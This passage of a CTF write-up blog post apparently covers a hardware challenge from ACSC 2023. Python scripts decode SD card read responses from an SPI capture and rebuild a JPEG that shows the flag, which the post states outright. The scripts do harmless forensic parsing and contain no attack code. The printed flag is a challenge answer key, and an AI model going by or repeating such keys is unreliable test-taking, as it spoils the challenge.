<p>I feel that the read data is the flag, so I decided to create another script to parse the response of the <code>CMD17</code>based on the specification in the second link:</p>
<ul>
<li>The start token is <code>\xFE</code>. So, the read data is started after the first occurence of <code>\xFE</code>.</li>
<li>The last two bytes are 16bit CRC.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;spi.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data_map</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="n">prev_cmd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">prev_arg</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;Device to SD Card : &#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">full_cmd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Device to SD Card : &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">full_cmd</span><span class="p">)[</span><span class="mi">2</span><span class="p">:][</span><span class="mi">47</span><span class="o">-</span><span class="mi">45</span><span class="p">:</span><span class="mi">47</span><span class="o">-</span><span class="mi">40</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># Based on the protocol specification</span>
</span></span><span class="line"><span class="cl">        <span class="n">arg</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">full_cmd</span><span class="p">)[</span><span class="mi">2</span><span class="p">:][</span><span class="mi">47</span><span class="o">-</span><span class="mi">39</span><span class="p">:</span><span class="mi">47</span><span class="o">-</span><span class="mi">8</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># Based on the protocol specification</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;CMD: </span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1"> | ARG: </span><span class="si">{</span><span class="n">arg</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">prev_cmd</span> <span class="o">=</span> <span class="n">cmd</span>
</span></span><span class="line"><span class="cl">        <span class="n">prev_arg</span> <span class="o">=</span> <span class="n">arg</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">prev_cmd</span> <span class="o">==</span> <span class="mi">17</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;SD Card to Device : &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">512</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span> <span class="c1"># Not useful response</span>
</span></span><span class="line"><span class="cl">        <span class="n">resp</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0xfe</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">start</span> <span class="o">=</span> <span class="n">idx</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="n">start</span><span class="p">:])</span> <span class="o">==</span> <span class="mi">514</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Get data (512 bytes per CMD17)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="n">start</span><span class="p">:</span><span class="n">start</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">512</span>
</span></span><span class="line"><span class="cl">        <span class="n">data_map</span><span class="p">[</span><span class="n">arg</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Stored resp in data_map...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Data[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">]: </span><span class="si">{</span><span class="n">data_map</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is the result (redacted because it&rsquo;s too long):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 27
</span></span><span class="line"><span class="cl">Stored resp in data_map...
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 23
</span></span><span class="line"><span class="cl">Stored resp in data_map...
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 11
</span></span><span class="line"><span class="cl">Stored resp in data_map...
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 24
</span></span><span class="line"><span class="cl">Stored resp in data_map...
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 9
</span></span><span class="line"><span class="cl">Stored resp in data_map...
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 45
</span></span><span class="line"><span class="cl">Stored resp in data_map...
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 2
</span></span><span class="line"><span class="cl">Stored resp in data_map...
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 8
</span></span><span class="line"><span class="cl">Stored resp in data_map...
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 62
</span></span><span class="line"><span class="cl">Stored resp in data_map...
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 41
</span></span><span class="line"><span class="cl">Stored resp in data_map...
</span></span><span class="line"><span class="cl">Data[0]: b&#34;\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00,\x1e!&#39;!\x1c,&#39;$&#39;2/,5BoHB==B\x88afPo\xa1\x8d\xa9\xa6\x9e\x8d\x9b\x98\xb1\xc7\xff\xd8\xb1\xbc\xf1\xbf\x98\x9b\xde\xff\xe0\xf1\xff\xff\xff\xff\xff\xac\xd5\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xdb\x00C\x01/22B:B\x82HH\x82\xff\xb7\x9b\xb7\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xc2\x00\x11\x08\x03U\x02\x80\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x19\x00\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\xff\xc4\x00\x18\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\xff\xda\x00\x0c\x03\x01\x00\x02\x10\x03\x10\x00\x00\x01\xf1\x80\x00\x00\x14\x00\x00\x00\x00R\x80\nR\x9a4n)\xa2\x9a(\x00\x00\x00\x00\x02\x80@\x00\x00\x00\x00\x00\x00\x01\xc4\xf1P\x00\x08\x00\x00\xa5:\x1a,R\x94\xa0\xa5)JP\n\x08\x00\x00\x00\x01@\x00\x00\x00\x00\x14\x10\x00\x00\x00\x00\x00\x00\x00d\xf9\xd4\x00\x02\x00\x00)\xe9\x8e\xe5\x00\x14\x00\x00\x00\x00P@\x00\x00\x02\x80\x00\x00\xa4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\xf9\xb5\x90\x00 \x00\x02\x9e\xe8\xd8\x05\x00\x00\x00\x00\x00P@\x00\x00\x02\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01O\t\xc6\x80\x02\x00\x00)\xf4`\n\x00\x00\x00\x00\x05\x00\x00@\x00\x05\x00\x00\x00\x00\x02\x90\x00\x00\x00\x00\x00\x00\x00\x00(&lt;\xa7\x96\x80\x10\x00\x00:\x9e\xe8\x00\x00\x00\x00\x00\x00\xa0\x00@\x01@\x00\x00\x00(\x00\x02\x00\x00\x00\x00\x00\x00\x00\n\x008\x9e\x1a\x02\x00\x00\x00\xf4G\xac\x00\x00\x00\x00\x00\x05\x00\x00@\n\x00\x00\x00\x00(\x00\x02\x00\x00\x00\x00\x00\x00\x00\n\x002|\xda\x00@\x00\x00\xf6Gp\x00\x00\x00\x00\x00\x14&#34;
</span></span><span class="line"><span class="cl">Data[1]: b&#39;\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x80\x00\x00\x00\x00\x00\x00\x14\x00\x01\xf3k \x02\x00\x00=\xf1\xd0\x00\x00\x00\x00\x01@\x00\x00\x00\x00\x00\x00\x00\x00P\x00 \x00\x00\x00\x00\x00\x00(\x00\x00x\xab\x80\x00\x80\x00S\xe9@\x00\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x00\x00\x02\x80\x00 \x00\x00\x00\x00\x00\n\x00\x00\x00y\x8f%\x00 \x00\x1b&gt;\x8c@\x00\x00\x00\x01@\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x04\x00\x00\x00)\x00(\x00\x00\x00\x00\x86\x0f\x9f@\x08\x00\x07c\xdb\x02\x80\x08\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00P\x00\x00\x02\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x03\xe6\xd6@ \x00\x1e\xa8\xf5\x00\x00 \x00\xa0\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00@\x00\x00\xa0\x00\x00\x00\x00\x01\n\x01\x01O\x1dy\xc0 \x00\x1e\xd8\xee\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x00\x00\x00\x80\x00\x01@\x00\x00\x00\x00\x02\x00\x01\x83e8\x1e*\x02\x00\n{\xe3\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x80\x00\x00\x80\x00\x00\x00\xa0\x00\x00\x00\x02\x14\xe6SG\x03\xb1\xa3\x81\xdc\xc9\xf3h\x08\x00)\xf4\xa2\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x00\x01H\x01HR\x14\x86A\xb0d\xd1\x82\x1b&lt;\xe7sG\x03\xb9\xc4\xec\x0e\x07b\x9f&gt;\xb9\x82\x00\r\x1fJ\x00\x00\x00\x00\x00\x00\x00\x00R\x00\x00\x05 2CF\x8c\x02\x94\x00S\x06Hh\xc9\xd4\xc1H\x0c\x94\xe8q;\x1c\xcc\x9d\xcc\x9c\x0e\xe4\x06\xce\x07py+\xcc\x08\x00:\x9e\xf8\x1c\xce\x842\r\x19)\xa3\x00\xd9\x90h\xe4u0h\xc1\xd0\xe0w9\x9a\x04\x06\x8c\x9a8\x9dM\x1c\xca@h\xe6u9\x9a4s(2t)\x83&amp;\xcd\x19!N\x86\nC`\x00\x00\x07\x13\xc3B\x00\x0fA\xec\x8e@\xeap;\x83\x91N\x87\x13\xb0\x07\x13\xb08\x9d\x8eGC\x99A\x0e\xa6\x0c\x90\xd9\xa3 \xc1\xd8\x1c\xc1\nt0d\xeay\xcfI\x82\x1b2l\xc0\x06\x8a\x01\x00(\x00\x00\x00\x04&gt;mB\x00\x0fY\xda0h\x18;&#39;
</span></span><span class="line"><span class="cl">Data[2]: b&#39;\x90\x14\xe0S\xa9\r\x1cN\xc48\x9dL\x9a)\xc4\xeep=\x07&#34;\x90\xd1L\x94\x80\xd0 )@!\r\x90\x14\x00\x00\x00\x02\x14\x00\x00\x00\x00\x0f\x05r \x00\xf7GR\x82\x03&amp;\x88C`\xc9J`\xd1@\x00\x00\x002R\x80\x00\x00\x00\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\x00\x10\xf2\x9ej\x80\x14\xfa1\xa0\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x80\x00\x00\x00\x00\x00\x00\x00\x01H\n\x00\x00\x00\x00\x00\x00\x08\x01N\&#39;\x86\xa0\x06\x8f\xa5\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa4\x00\x00\x00\x00\x00\x00\x00\x00\x01A\n\x00\x00\x00\x00\x00\x00\x00\x00\x87\xcd\xac\x80v=\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\x00\x02\x02\x9f&gt;\xb9\x00z\x8fT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x1eZ\xf2\x80{c\xb8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00r&lt;\x14)\xf4#`\x14\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\xa6O\x99B\x9fN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf9T:\x1fF \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&gt;U\x0fA\xed\x81\n\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf9T=g\xaa\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x0f\x97T\xf7G`\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xe5U&gt;\x94h\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00(\x00\x10\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x95Z&gt;\x9c\x00\x00\x00\x08\x00&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>From that data, notice that the first data has <code>JFIF</code> file signature, which mean the stored data in the SD Card are a picture. Let&rsquo;s try to extract that from the data that we got. Below is the full script that I use to extract it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;spi.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data_map</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="n">prev_cmd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">prev_arg</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;Device to SD Card : &#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">full_cmd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Device to SD Card : &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">full_cmd</span><span class="p">)[</span><span class="mi">2</span><span class="p">:][</span><span class="mi">47</span><span class="o">-</span><span class="mi">45</span><span class="p">:</span><span class="mi">47</span><span class="o">-</span><span class="mi">40</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># Based on the protocol specification</span>
</span></span><span class="line"><span class="cl">        <span class="n">arg</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">full_cmd</span><span class="p">)[</span><span class="mi">2</span><span class="p">:][</span><span class="mi">47</span><span class="o">-</span><span class="mi">39</span><span class="p">:</span><span class="mi">47</span><span class="o">-</span><span class="mi">8</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># Based on the protocol specification</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;CMD: </span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1"> | ARG: </span><span class="si">{</span><span class="n">arg</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">prev_cmd</span> <span class="o">=</span> <span class="n">cmd</span>
</span></span><span class="line"><span class="cl">        <span class="n">prev_arg</span> <span class="o">=</span> <span class="n">arg</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">prev_cmd</span> <span class="o">==</span> <span class="mi">17</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;SD Card to Device : &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">512</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span> <span class="c1"># Not useful response</span>
</span></span><span class="line"><span class="cl">        <span class="n">resp</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0xfe</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">start</span> <span class="o">=</span> <span class="n">idx</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="n">start</span><span class="p">:])</span> <span class="o">==</span> <span class="mi">514</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Get data (512 bytes per CMD17)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="n">start</span><span class="p">:</span><span class="n">start</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">512</span>
</span></span><span class="line"><span class="cl">        <span class="n">data_map</span><span class="p">[</span><span class="n">arg</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Stored resp in data_map...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">full_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">data_map</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">full_data</span> <span class="o">+=</span> <span class="n">data_map</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;spi_out.jpg&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">out_file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">out_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">full_data</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After that, let&rsquo;s try to open the output file.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/hGpr1Cz.png"
        data-srcset="https://i.imgur.com/hGpr1Cz.png, https://i.imgur.com/hGpr1Cz.png 1.5x, https://i.imgur.com/hGpr1Cz.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/hGpr1Cz.png"
        title="https://i.imgur.com/hGpr1Cz.png" /></p>
<p>Turn out it is the flag!</p>
<blockquote>
<p><strong>Flag: ACSC{1tW@sE@syW@snt1t}</strong></p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/acsc-2023/" data-title="ACSC 2023" data-via="Chovid99" data-hashtags="Writeup,ACSC,pwn,hardware,ssti,sd-card,heap,libc-2.35,fsop,2023"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/acsc-2023/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/acsc/">ACSC</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/hardware/">Hardware</a>,&nbsp;<a href="/tags/ssti/">Ssti</a>,&nbsp;<a href="/tags/sd-card/">Sd-Card</a>,&nbsp;<a href="/tags/heap/">Heap</a>,&nbsp;<a href="/tags/libc-2.35/">Libc-2.35</a>,&nbsp;<a href="/tags/fsop/">Fsop</a>,&nbsp;<a href="/tags/2023/">2023</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/hacktm-ctf-2023/" class="prev" rel="prev" title="HackTM CTF 2023"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTM CTF 2023</a>
            <a href="/posts/cyber-apocalypse-2023-pwn/" class="next" rel="next" title="Cyber Apocalypse 2023: Pwn">Cyber Apocalypse 2023: Pwn<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
